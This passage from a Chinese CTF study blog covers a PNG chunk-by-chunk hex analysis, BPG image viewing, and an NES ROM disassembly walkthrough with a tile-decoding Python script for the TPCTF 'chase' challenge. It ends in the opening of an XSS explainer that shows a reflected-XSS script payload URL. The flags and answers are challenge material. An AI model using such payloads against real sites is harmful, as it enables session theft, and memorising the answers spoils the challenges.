496d 6167 6552 6561  e.Adobe ImageRea&lt;br&gt;0000040: 6479 71c9 653c 0000 0344 4944 4154 78da  dyq.e&lt;...DIDATx.&lt;br&gt;0000050: b454 4b48 5b51 10bd 792f 2646 a346 7411  .TKH[Q..y/&amp;F.Ft.&lt;br&gt;0000060: 450b cac3 6840 8c14 0242 8542 e9aa ab42  E...h@...B.B...B&lt;br&gt;0000070: 5785 8614 c428 b4d0 5569 b108 5dbb 29b4  W....(..Ui..].).&lt;br&gt;0000080: 1b05 a5ab 6cb3 2a14 0ab5 8b42 75a3 d188  ....l.*....Bu...&lt;br&gt;0000090: 82c6 0ff1 4320 a2e2 2f7e 12ed 9c47 e671  ....C ../~...G.q&lt;br&gt;00000a0: 8d2f 8950 3a30 dcc7 bb33 67e6 cee7 5826  ./.P:0...3g...X&amp;&lt;br&gt;00000b0: 2626 8499 288a a2ab d56a d555 55d5 57d7  &amp;&amp;..(....j.UU.W.&lt;br&gt;00000c0: d7d7 be6c 36fb fef2 f232 45a7 b8ba ba12  ...l6....2E.....&lt;br&gt;00000d0: c160 5014 13ab d94f 8bc5 72e3 24e0 1e9f  .`P....O..r.$...&lt;br&gt;00000e0: cff7 b9ae ae4e 4c4e 4eda 3299 4c00 777c  .....NLNN.2.L.w|&lt;br&gt;00000f0: 5f4c 1472 16f9 9a07 2e6a 6b6b 875a 5b5b  _L.r.....jkk.Z[[&lt;br&gt;0000100: 454d 4d8d e8ea ea7a 4eff 3ce2 8ea2 3018  EMM....zN.&lt;...0.&lt;br&gt;0000110: 94cb c28a 7f04 765f d3b4 27ec d0d8 d8a8  ......v_..&#39;.....&lt;br&gt;0000120: 5655 55bd 639b 9201 a8b6 a8af 516b 9bcd  VUU.c.......Qk..&lt;br&gt;0000130: 26ca caca f46f 0020 7bb7 db6d 38d8 ed76  &amp;....o. &#123;..m8..v&lt;br&gt;0000140: d1d1 d1f1 82ee 34d8 940c 0023 00c2 11e0  ......4....#....&lt;br&gt;0000150: 1c20 975d 2781 3d75 381c 379c 9a9b 9b55  . .]&#39;.=u8.7....U&lt;br&gt;0000160: 2ad7 1012 bb73 0028 c073 1373 8f02 3c68  *....s.(.s.s..&lt;h&lt;br&gt;0000170: 6b6b fb44 25b9 e554 5e5e 2eba bbbb f18a  kk.D%..T^^......&lt;br&gt;0000180: c791 4844 2b16 c012 0e87 fd04 faac bebe  ..HD+...........&lt;br&gt;0000190: be85 cad1 e272 b97c 04a0 e245 4ea7 530f  .....r.|...EN.S.&lt;br&gt;00001a0: 5c48 8e8f 8f45 3a9d d6f5 f0f0 7091 747b  \H...E:.....p.t&#123;&lt;br&gt;00001b0: 7777 779d feff a649 0b07 0281 acb5 baba  www....I........&lt;br&gt;00001c0: fa97 dfef 7710 7041 309e 2c79 ba20 4800  ....w.pA0.,y. H.&lt;br&gt;00001d0: 9a13 2f81 7a11 7479 79b9 3f16 8ba1 ae63  ../.z.tyy.?....c&lt;br&gt;00001e0: caf9 f979 120b 83c5 81e6 03e3 8e4f 59e5  ...y.........OY.&lt;br&gt;00001f0: a010 5e3c f405 2705 dbd6 7b90 4aa5 1ecd  ..^&lt;..&#39;...&#123;.J...&lt;br&gt;0000200: cdcd 250e 0e0e c4c5 c585 a080 fa49 0686  ..%..........I..&lt;br&gt;0000210: 1303 ca81 7007 1bf6 c1f7 d9d9 9958 5b5b  ....p........X[[&lt;br&gt;0000220: 1384 f73a 140a 7de3 3d58 27e9 8d46 a371  ...:..&#125;.=X&#39;..F.q&lt;br&gt;0000230: 0491 c14a 89fc 1204 01f8 d4d4 1461 87be  ...J.........a..&lt;br&gt;0000240: e46f 7262 6363 a377 6666 6671 6f6f cfc8  .orbcc.wfffqoo..&lt;br&gt;0000250: dc6c cb65 651b 3439 1e8f 03bc 8fc0 c70a  .l.ee.49........&lt;br&gt;0000260: 5145 3291 483c 5c58 5888 a251 a5c0 5989  QE2.H&lt;\XX..Q..Y.&lt;br&gt;0000270: f8c4 d6d6 5676 7a7a fae5 c0c0 c0f8 ad3d  ....Vvzz.......=&lt;br&gt;0000280: c823 ac14 3df3 c3d1 d191 d1e4 620a 5f94  .#..=.......b._.&lt;br&gt;0000290: 6673 7333 3238 38f8 b520 9be6 3887 ff79  fss3288.. ..8..y&lt;br&gt;00002a0: 989b f85f 7e3f e4a4 b0f1 74af 1525 3b36  ..._~?....t..%;6&lt;br&gt;00002b0: 8423 ed45 6745 4585 012c 4f92 3c41 fc02  .#.EgEE..,O.&lt;A..&lt;br&gt;00002c0: d008 ed90 7774 74d4 5694 4df9 248e f182  ....wtt.V.M.$...&lt;br&gt;00002d0: 3278 4ccd 9aca 8161 039f caca 4a80 9b52  2xL....a....J..R&lt;br&gt;00002e0: b855 1e49 3a55 32f6 c209 60bc 4068 3aa6  .U.I:U2...`.@h:.&lt;br&gt;00002f0: 8b1a 9aa6 041c 4429 3a6f 7150 3000 9d9d  ......D):oqP0...&lt;br&gt;0000300: 641e 33ed 8114 a485 0238 4178 703c 3939  d.3......8Axp&lt;99&lt;br&gt;0000310: 11c9 6452 acac acfc 248e 798b 9d21 b0e1  ..dR....$.y..!..&lt;br&gt;0000320: f6f6 f6fe a6a6 2683 5ec0 5b94 948f eec3  ......&amp;.^.[.....&lt;br&gt;0000330: 055f c001 3015 5838 64bc baba 1add d9d9  ._..0.X8d.......&lt;br&gt;0000340: 01f0 0f76 a0cd 7d33 3f3f 3f42 73ff d1e3  ...v..&#125;3???Bs...&lt;br&gt;0000350: f104 1b1a 1a54 f890 6805 a748 9a92 3fb4  .....T..h..H..?.&lt;br&gt;0000360: e6df 691f dcfb fbfb 2366 19e5 64fb f4f4  ..i.....#f..d...&lt;br&gt;0000370: b46f 7676 7664 6969 6998 5ed1 43fd 1837  .ovvvdiii.^.C..7&lt;br&gt;0000380: a5eb bb50 c2bf 8822 feb3 fc15 6000 74fe  ...P...&quot;....`.t.&lt;br&gt;0000390: 7622 c159 82da 0000 0000 4945 4e44 ae42  v&quot;.Y......IEND.B&lt;br&gt;00003a0: 6082 0a                                  `..&lt;br&gt;</code></td></tr></tbody></table><p>接下来我们试着分析一下：</p><p>首先是八个字节的文件头标志，标识着png文件：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;1&lt;br&gt;</code></td><td><code>&lt;br&gt;8950 4e47 0d0a 1a0a&lt;br&gt;</code></td></tr></tbody></table><p>接下来的地方就是IHDR数据块了：</p><p>0000 000d说明IHDR头块长为13</p><p>4948 4452IHDR标识（ascii码为IHDR）</p><p>下面是IHDR数据块的实际内容</p><p>0000 0018图像的宽，24像素</p><p>0000 0018图像的高，24像素</p><p>08 表示色深，这里是2^8&#x3D;256，即这是一个256色的图像</p><p>06 颜色类型，查表可知这是带α通道数据的真彩色图像</p><p>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</p><p>00 同上</p><p>00 非隔行扫描</p><p>e0 773d f8 CRC校验</p><p>以上分析了第一个IHDR块的内容，其他块的分析方法类似，比如接下来的就是tEXt块了，很简单，不做分析了。（当然这里还有重要的IDAT块，这是图像的实际内容）</p><p>最后得有个IEND数据块，这部分正如上所说，通常都应该是</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>由于我用的是vim打开，vim在文件最后都会恶心的自己加上0a换行，当然这并没有什么坏的影响。不过这也提醒了我们一个问题，既然在IEND块后面添加任何的字符都对文件的打开造成不了影响，那我们就可以在这里藏一些数据了（当然这种藏法很low）。。。</p><p>OK，这就是png文件的基本构造了。</p><h2 id="例题：可能会修改文件名"><a href="#例题：可能会修改文件名" class="headerlink" title="例题：可能会修改文件名"></a>例题：可能会修改文件名</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423.png"></p><p>可能是头文件出问题</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1.png"></p><p>看上面的8个字节头文件标志</p><p>89 50 4E 47 0D 0A 1A 0A</p><p>改完就可以打开图片了</p><h1 id="BPG文件格式详解"><a href="#BPG文件格式详解" class="headerlink" title="BPG文件格式详解"></a>BPG文件格式详解</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>BPG（Better Portable Graphics）是一种新的图像格式。 其目的是在质量或文件大小成问题时替换JPEG图像格式。 它的主要优点是：</p><p>1、压缩比高。 对于类似的质量，文件比JPEG小得多。</p><p>2、大多数Web浏览器都支持小型Javascript解码器（gzip压缩大小：56 KB）。</p><p>3、基于HEVC开放视频压缩标准的子集。</p><p>4、支持与JPEG（灰度，YCbCr 4：2：0,4：2：2,4：4：4）相同的色度格式，以减少转换过程中的损耗。 支持Alpha通道。 还支持RGB，YCgCo和CMYK颜色空间。</p><p>5、本机支持每通道8至14位，以获得更高的动态范围。</p><p>6、支持无损压缩。</p><p>7、可以包括各种元数据（例如EXIF，ICC配置文件，XMP）。</p><p>8、动画支持。</p><p>原文链接：<a href="https://blog.csdn.net/CT_WJ/article/details/97812299">https://blog.csdn.net/CT_WJ&#x2F;article&#x2F;details&#x2F;97812299</a></p><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p>只考虑电脑上，Honeyview 是目前我评价最高的看图软件，地址：<a href="https://www.bandisoft.com/honeyview/">www.bandisoft.com/honeyview</a>。截面乍一看有点古朴：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531586323-c3eaaf07-e067-4b09-a548-d29e7041d0ae.png"></p><p>安装之后设置一下，让菜单自动隐藏就没问题了，实际用的时候只会显示个窗口边框。现在还没遇到它不支持的图片格式，除了矢量图，比如svg 和cad 的格式。</p><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><p>图片批量转换成bpg 可以用honeyview 的资源管理器右键菜单，也可以用一个叫romeolight bpgconv 的工具，专门用来把jpg 和png 批量转换成bpg。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531685378-62100093-7327-4704-9842-13ae5a729073.png"></p><p>把图片文件夹拖进去，工具会筛选出所有jpg，jpeg 和png 文件，然后点一下左上角的三角按钮就开始批量转换。文件数量比较多，图片内容比较复杂的话转换时间会很长，吃CPU，可以全核跑满。一批图片处理完之后点左上角的圆圈箭头清空列表，然后可以再往里拖一批，不先清空的话它会把处理完的图片再处理一遍。</p><p>转换之前，最好先点开右上角的三条杠，打开菜单，调整一下输出文件的位置：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531712314-da14e416-8e4e-4283-862c-a9416aa3a446.png"></p><p>默认是自动在桌面新建个文件夹，所有输出文件放在里面，切换成“Same Location as File”，输出文件就会放在源文件同目录下，如果一次转换多个文件夹，这样图片分类不会乱。其他设置都不用动。转换完再手动把所有jpg，png 源文件删除掉就行了，比如直接rm *.jpg。</p><p>这个软件的官网似乎已经挂了，windows 上想安装，可以用scoop 安装个绿色版：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">install </span><span class="hljs-keyword">bpgconv</span><br></code></pre></td></tr></table></figure><p>或者下载我复制出来的绿色包：<a href="https://download.csdn.net/download/Etberzin/86504852">download.csdn.net&#x2F;download&#x2F;Etberzin&#x2F;86448960</a>，0 积分。再或者，随便搜个下载站，风险自担。</p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p>但是转换成bpg 之后，windows 资源管理器里不能显示图片预览，想找个图片就比较麻烦，honeyview 可以打开bpg，但是没有给资源管理器集成bpg 的预览功能。所以又要找个工具，Simple BPG Image Viewer ：github.com&#x2F;asimba&#x2F;pybpgviewer&#x2F;releases&#x2F;tag&#x2F;v1.28，这也是个bpg 图片查看器，不如honeyview 好用，但是提供了bpg 预览的插件。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531820822-3fca6a90-c152-4258-9fd6-edf63166c877.png"></p><p>点击红圈里的链接下载个安装包，一路ok 安装完，可能需要把软件启动一次，然后用资源管理器打开有bpg 图片的文件夹，图片预览应该就能自动加载出来了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>日常使用可能还是webp 更方便，支持的范围更广。要是所有图片都拿bpg 存，到时候想给别人发个图还得先转换成jpg 或者webp。只是我感觉webp 压出明显差异的可能性更大，bpg 最适合用的场合是那些估计只有自己看的一大堆图片库存，比如瑟图~ 不过几千张瑟图转换一波能省的空间也不过就几个GB 而已，大概是把一共5GB 的的图片文件夹压缩到500MB 这个程度，有没有用~ 自己看呗。</p><p>原文链接：<a href="https://blog.csdn.net/Etberzin/article/details/126502703">https://blog.csdn.net/Etberzin/article/details/126502703</a></p><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p>看到bpg格式的图片拖入honeyview就可以看到flag了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721532010959-1aaf41bd-4461-4dea-a80d-a65f1c851cfe.png"></p><p>ctfshow{aade771916df7cde3009c0e631f9910d}</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/test/"/>
    <url>/2025/03/22/test/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/fogota/article/details/6767758">https://blog.csdn.net/fogota/article/details/6767758</a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一、如何找到Mapper&#x3D;0的NES游戏？</p><p>你自然有不少的NES文件，同时也知道上哪去下载这些文件，你可以多下载一些你觉得简单的游戏。我下面介绍查看mapper值的方法。</p><p>我已经找到几个Mapper&#x3D;0的游戏：超级玛丽、坦克大战</p><p>方法有两个</p><p>方法(1) VirtuaNES</p><p>用VirtuaNES 打开NES文件，点菜单“文件-ROM信息”就可以查看mapper值了。</p><p>方法(2) NesHeader</p><p>用网友“疾风の迅雷”写的一个软件NesHeader.exe，可以批量读取整个文件夹上所有NES文件的ROM信息。</p><p>**</p><p>找到Mapper0的NES游戏之后，我们来确定机器码的运行首地址。</p><p>Mapper0的nes只有一段机器码段，这就好办了。其首地址有可能是</p><p>   $8000  或  $C000</p><p>先不要问我为什么有两个可能性，我先来教你判断。</p><p>二、怎样判断Mapper0的NES游戏的机器码的首地址。</p><p>第一步：我提供两个办法。</p><p>先看NES文件的大小,</p><p>NES文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418451147-c7014651-ee07-41a9-b57d-f2227826a2a0.png" alt="img"></p><p>另一个办法：用上面提到的NesHeader.exe，查看PROM大小,</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418463059-b44b4680-4b01-4282-a99b-9ea6a0874ca8.png" alt="img"></p><p>第二步：如果nes大小&#x3D;24K则要查看游戏程序的运行地址区域。</p><p>用Fcdebug打开ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，查看（运行）地址。（这时看到的是正在运行任一条指令）</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418480682-5e7ed3b8-7e54-481a-8da1-19dd483fcc67.png" alt="img"></p><p>本办法是针对Mapper0的NES而设计的，对于别的Mapper值则完全不适用。</p><p>钻牛角的人要跑来问“别的Mapper是如何找到首地址？”</p><p>我在文章的后面解答一下吧。</p><p>**</p><p>接下来要将机器码从NES文件上分离出来。</p><p>你要知道，NES文件是由文件头(Head)、程序ROM（即PROM）、图形ROM（即VROM）组成。在ROM里面，连接的顺也是Head-PROM-VROM。其中Head固定占16字节；PROM占[n x 16K]，n是一个倍数；VROM占[m x 8K]，m是一个倍数。</p><p>朋友们看出来了，这个PROM的大小和VROM的大小在ROM信息中出现过。</p><p>PROM一般是16K为1页(1 bank)，也有8K,4K为单位的。因不同的Mapper值而异。（NES文件中统统以16K为单位记录）</p><p>我们专门说Mapper0，这个号是不切页的，所以可以看成只有1页，也就是说：</p><p>注：机器码首地址，指机器码运行时在寄存器中的首地址，不是NES文件上的地址。</p><p>NES大小</p><p>PROM大小</p><p>机器码首地址</p><p>机器码末地址</p><p>机器码长度</p><p>40K</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420979634-50c13261-8ea0-4a2a-90f8-42ae8eebea88.png" alt="img"></p><p>在上面的述中揭示了一些东西。要是看不明白也没关系，下面可以照着做。</p><p>三、如何才能将机器码从NES文件上分离出来？</p><p>我提供两个办法。上面用到的地址，我都算准了。</p><p>方法(1)DUMP法：</p><p>用FCdebug(NES_debug)运行ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，在窗口的最底行，找到“内存”，在边上的两个编辑框里，填入首地址和末地址，建议末地址统一填FFFF，其中$号省略。然后按“DUMP下来”，保存成mem文件。</p><p>FCdebug是VirtuaNES的一个改版，加入了debug功能。</p><p>方法(2)HEX编辑法：</p><p>用HEX类编辑软件，打开ROM。例如Hex Workshop。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420994150-67b1ac62-76fd-4ae2-bf02-d7b347c5a242.png" alt="img"></p><p>将这个地址以下的部分（包括这个分界点）删除或剪切走。留下的部分另存为mem文件。</p><p>**</p><p>终于到了反汇编软件上场了。</p><p>有人会问：“这个mem是什么文件？”</p><p>这个是内存文件，其实就是机器码，里面没有别的东西了。这个后缀名不重要，因为都没有关联软件。你叫他bin文件或别的都行。我只为统一叫法。</p><p>四、如何将mem文件显示成汇编代码呢？</p><p>我用这个</p><p>看图标,这是我用的“反汇编器”。它可以对多种CPU进行反汇编。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421022907-3e6fcc2e-ca2e-4252-986c-12cb303d8471.png" alt="img"></p><p>（1）打开它，先要选CPU，在窗口右上角选6502。</p><p>（2）用这个反汇编软件,打开mem文件。</p><p>（3）然后点选项“BIN文件”,在开始地址,填上“首地址”,</p><p>（4）确定提勾“立即反编译”，点“确定”就OK</p><p>（5）保存反汇编的asm文档,结束。</p><p>**</p><p>汇编代码是反出来了。可是问题来了：“从何看起？”</p><p>针对NES的结构，机器码是有一个入口的，这个入口的地址写在一个固定的地方。我们叫“指针”。共有3个指针，都放在一起，分别指向NMI、RESET、IRQ|BRK。其中RESET就是主程序的入口，NMI是中断的入口，IRQ|BRK是另一种中断入口。</p><p>五、如何找到程序的入口？</p><p>将asm文件（用记事本）打开，滚动条向下拉，拉到底。看到FFFA到FFFF的数据，抄下来。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421106794-4b2335c0-145a-470f-a4ae-039659f924eb.png" alt="img"></p><p>记a,b 是一组指针，实际地址为ba，即a为低位，b为高位。如此类推得3组指针</p><p>NMI &#x3D; ba</p><p>RESET &#x3D; dc</p><p>IRQ|BRK &#x3D; fe</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421059983-d610e2cd-cb14-48ce-a625-ef24d88859d3.png" alt="img"></p><p>NMI &#x3D; $8035</p><p>RESET &#x3D; $8000</p><p>IRQ|BRK &#x3D; $805C</p><p>六、注意事项</p><p>反汇编的结果不是全都是代码，其中有部分可能会是数据，也有可能整页都是图型（CHR）数据。反汇编器总是优先将能够反成代码的译成代码。于是你会发现在DB旁边出现没有作用的代码，有时发现代码去读一个指令，其实是在读指针或数据。</p><p>另外一些软件生成的ROM会加入一些没机会运行的代码。这可能是优化不完全。</p><p>七、局部反汇编，只做第三步和第四步就行。其中第三步用dump法。具体，多接触就会了解。</p><p>疑难解答：</p><p>Mapper是什么?</p><p>​    Mapper是一个编号，用于区分不同电路结构的卡带。NES模拟器拿一个ROM当作是一个卡带来模拟，那么卡带的电路也要区分才能模拟的。卡带不是标准统一的，当时不同的NES游戏开发商都开发出自己独有的保密的卡带；还发展出多个不同的升级产品，可以令游戏性能更理想；同时对游戏程序有保密作用。</p><p>为什么Mapper0的ROM机器码首地址有可能是$8000或$C000？</p><p>Mapper0就是表示卡带电路没有任何特别，卡带的寄存器是直接接到CPU总线上的。也就是有可能</p><p>(1)       16K的寄存器接到$8000-$BFFF的地址上并镜像到$C000-FFFF。</p><p>(2)       32K的寄存器接到$8000-$FFFF的地址上。</p><p>在(1)情况下，$8000-$BFFF和$C000-FFFF的机器码是完全一样的。主要是看程序的作者，将代码（基于）.org $8000还是.org $C000进行编译的。</p><p>我本来想在“判断首地址”的方法用程序入口的办法，但这个不准确，因为在(1)情况下我可以恶作剧的将程序入口改成对应镜像的位置，程序一样是正常运行的。</p><p>Mapper0以外的ROM是如何找到首地址？</p><p>只有Mapper0不切页，换句话说，Mapper0是静态将寄存器接入总线。其余的Mapper都是动态的将寄存器接入总线。也就是说，是通过程序控制接入某一块寄存器接入总线上某地址段，而原接入的块（页）断开。</p><p>答案就是：你要先知道最早是默认接入的寄存器页，将之按mapper0的方法反汇编。然后从程序入口，一行一行看代码，看调入了哪一页，然后计算这一页的位置，将它分离出来。再反汇编。如此直到掌握全部页的动向。</p><h1 id="FCEUX使用"><a href="#FCEUX使用" class="headerlink" title="FCEUX使用"></a>FCEUX使用</h1><h2 id="debug-ppu-viewer"><a href="#debug-ppu-viewer" class="headerlink" title="debug  ppu viewer"></a>debug  ppu viewer</h2><p>右键可以更改颜色</p><p><a href="https://fceux.com/web/help/PPUViewer.html">https://fceux.com/web/help/PPUViewer.html</a></p><p>介绍</p><p>NES 架构包括一个 6502 CPU 以及一个称为 PPU（图片处理单元）的自定义视频控制器。PPU 的视频内存与主 CPU 内存分开，可以通过特殊端口进行读&#x2F;写（请参阅 <a href="https://fceux.com/web/help/PPU.html">PPU 内存</a>）。</p><p>PPU 查看器将仅显示当前 PPU 内存的内容。它不会以任何方式更改游戏数据。</p><p>使用 PPU 查看器</p><p>在扫描线上显示</p><p>此选项使其显示屏幕绘制该特定扫描线时 PPU 的外观。它对于像 SMB 这样的游戏很有用，这些游戏会在帧中交换模式表（例如，用于状态栏内容）。</p><p>右键单击其中一个 PPU 面板将更改显示它的调色板，在图案调色板之间循环，然后是 sprite 调色板，然后是第九个固定的灰色调色板（如果所有调色板当前都是黑色的，则可用于检查 CHR）。</p><p>将鼠标光标放在图块上将显示图块地址。将光标移动到调色板颜色上将给出调色板地址。</p><p>当 <a href="https://fceux.com/web/help/CodeDataLogger.html">Code&#x2F;Data Logger</a> 运行时，您还可以使用 “Mask unused graphics” 功能。或者，您只能遮罩已使用（绘制或以其他方式访问）的图块，并强调未使用的图块（例如，为了查找秘密 Sprite）。</p><p>注意：此功能仅适用于使用 CHR ROM 的游戏，因为代码&#x2F;数据记录器仅记录对 CHR ROM 的访问。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741708767826-f8f2b419-b32e-4905-b88a-5ff17c37cf22.png" alt="img"></p><h2 id="debug-cheat"><a href="#debug-cheat" class="headerlink" title="debug cheat"></a>debug cheat</h2><p>先看ram search  确定变量</p><p>再cheat 可以导入随机数</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="例题xctf-chase"><a href="#例题xctf-chase" class="headerlink" title="例题xctf chase"></a>例题xctf chase</h2><p>mapper为0</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28.png" alt="img"></p><p>看到机器码从8000</p><p>ida用二进制打开 以6502的形式</p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105.png" alt="img"></p><p>可以直接ce开挂, </p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc.png" alt="img"></p><p>TPCTF{D0_Y0U_L1KE_</p><p>也可用FCEUX自带的cheat改动<img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545.png" alt="img"></p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>法1</p><p>经过不断调试发现AB对应的值和场景有关，每个场景对应值固定且范围普遍在0-60之间，那么尝试爆破，调整AB的值，改内存时发现会有随机性，相同的值不保证每次的闪烁结果相同，这里是尝试到0x15时看到flag2：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741709756176-dbd26352-cb02-462d-8549-d69b24d71089.png" alt="img"></p><p>法2</p><p>第二段有点misc的感觉，猜测也是在内存里面只不过不会加载到屏幕上，由于每段flag开头都会有THE FLAG PT我们搜索这几个字符的tile 34 28 25,一共发现两个其实一个是第一段flag，tile D2就是代表字符2 D1也就是字符1</p><p>这段是flag1</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324.png" alt="img"></p><p>第二段是flag2</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710162833-33cee26d-da76-4d11-87dc-0609309ade76.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">import binascii<br><br>data = &quotquot;<br><br>data = binascii.a2b_hex(data)<br><br>table = &#123;&#125;<br>str_1 = ord(&quot;A&quot;)<br>for i in range(0x21,0x3B):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>table[0x20] = &quot;@&quot;<br>table[0] = &quot; &quot;<br>table[0x3d] = &quot;_&quot;<br>str_1 = ord(&quot;0&quot;)<br>for i in range(0xD0,0xDA):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>flag = &quot;&quot;<br><br>for i in range(len(data)):<br>    for key,value in table.items():<br>        if data[i] == key:<br>            flag += value<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb.png" alt="img"></p><p>THE FLAG PT2 FOR YOU IS  PLAY1N9_6@M3S_       LBRDTRPLGXAQRPAQGXCSRPEUGXCSRPIYGXGWRPFVGXHXIPFPDPAP            GWWWH H H H @@@LEVEL  GEMS       LIVES       CDMLO@0      </p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>看ppu viewer</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426.png" alt="img"></p><p>ON_Y0UR_N3S?}</p><p>FLAG：TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ ON_Y0UR_N3S?}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2025/03/22/XSS/"/>
    <url>/2025/03/22/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击（Cross-Site Scripting，简称XSS）作为一种广泛存在的web应用程序安全漏洞，其机制在于利用了客户端与服务器之间数据交换过程中的信任链被恶意破坏。该类攻击的核心原理是攻击者通过向Web应用程序注入精心构造的、能够在受害者浏览器环境下执行的恶意脚本代码。这些注入的脚本在用户无意识的情况下被执行，不仅能够非法获取用户的cookies、session令牌等身份认证信息，还可能操纵用户的浏览器发起进一步的非授权操作，对用户隐私和网站安全性构成严重威胁。</p><h2 id="反射型XSS（Non-persistent-XSS）"><a href="#反射型XSS（Non-persistent-XSS）" class="headerlink" title="反射型XSS（Non-persistent XSS）"></a>反射型XSS（Non-persistent XSS）</h2><p>这种类型的XSS攻击依赖于用户点击由攻击者精心构造的带有恶意脚本参数的URL，而这些URL通常伪装成合法链接或者嵌入在电子邮件、即时消息等载体中。当服务器接收到这样的请求后，未经验证就将含有恶意脚本的数据直接反映在响应页面中，进而触发执行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://example.com/search?q=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;你已被黑客入侵&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="存储型XSS（Persistent-or-Stored-XSS）"><a href="#存储型XSS（Persistent-or-Stored-XSS）" class="headerlink" title="存储型XSS（Persistent or 